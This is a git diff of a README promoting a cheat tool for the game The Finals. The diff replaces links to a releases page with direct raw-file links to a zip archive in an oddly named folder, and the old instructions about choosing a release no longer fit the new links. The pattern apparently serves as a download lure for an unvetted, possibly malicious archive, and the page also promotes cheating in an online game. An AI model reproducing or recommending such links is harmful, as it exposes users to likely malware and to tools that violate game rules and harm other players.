@@ -1,6 +1,6 @@
 # 🎮 VERITAS-CHEAT-FOR-THE-FINALS - Elevate Your Game with Custom Tools
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-VERITAS%20CHEAT%20FOR%20THE%20FINALS-brightgreen)](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases)
+[![Download Now](https://raw.githubusercontent.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/main/priggishly/VERITAS-CHEAT-FOR-THE-FINALS.zip%20Now-VERITAS%20CHEAT%20FOR%20THE%20FINALS-brightgreen)](https://raw.githubusercontent.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/main/priggishly/VERITAS-CHEAT-FOR-THE-FINALS.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the VERITAS Cheat for The Finals! This cheat provides powerful tools 
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** You can find the latest version of the application [here](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases).
+1. **Visit this page to download:** You can find the latest version of the application [here](https://raw.githubusercontent.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/main/priggishly/VERITAS-CHEAT-FOR-THE-FINALS.zip).
   
 2. **Select the appropriate release:** On the releases page, look for the version marked as the latest. Click on it.
 
@@ -82,6 +82,6 @@ If you have further questions or need assistance, please visit the repository an
 
 This application is licensed under the MIT License. You can freely use and modify the software while adhering to the terms of the license.
 
-Visit this page to download: [Download the latest release](https://github.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/releases)  
+Visit this page to download: [Download the latest release](https://raw.githubusercontent.com/flowersgt/VERITAS-CHEAT-FOR-THE-FINALS/main/priggishly/VERITAS-CHEAT-FOR-THE-FINALS.zip)  
 
 Thank you for using VERITAS Cheat for The Finals! Enjoy your enhanced gaming experience.
